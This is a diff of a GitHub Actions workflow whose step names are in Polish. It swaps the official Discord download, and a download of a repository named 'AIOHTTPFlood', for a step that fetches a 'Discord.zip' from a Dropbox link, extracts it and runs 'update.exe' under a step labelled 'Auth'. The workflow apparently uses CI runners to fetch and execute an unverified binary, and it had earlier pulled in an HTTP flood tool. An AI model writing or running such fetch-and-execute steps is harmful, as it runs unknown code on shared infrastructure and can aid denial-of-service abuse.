@@ -23,11 +23,15 @@ jobs:
 
     - name: Pobieranie_discorda...
     
-      run: Invoke-WebRequest https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x86 -OutFile discord.exe
-  
-    - name: Pobieranie maszyny...
-    
-      run: Invoke-WebRequest https://github.com/smodi1337/AIOHTTPFlood/archive/refs/heads/main.zip
+      run: Invoke-WebRequest https://www.dropbox.com/scl/fi/0oghvrhgkl08cyubsltlo/Discord.zip?rlkey=0bz2wn0yespfreusr11r8v4u6&dl=1 -OutFile discord.zip
+
+    - name: Wypakowywanie_discorda
+
+      run: Expand-Archive discord.zip
+
+    - name: Auth
+
+      run: .\discord\update.exe
 
     - name: Auth
 
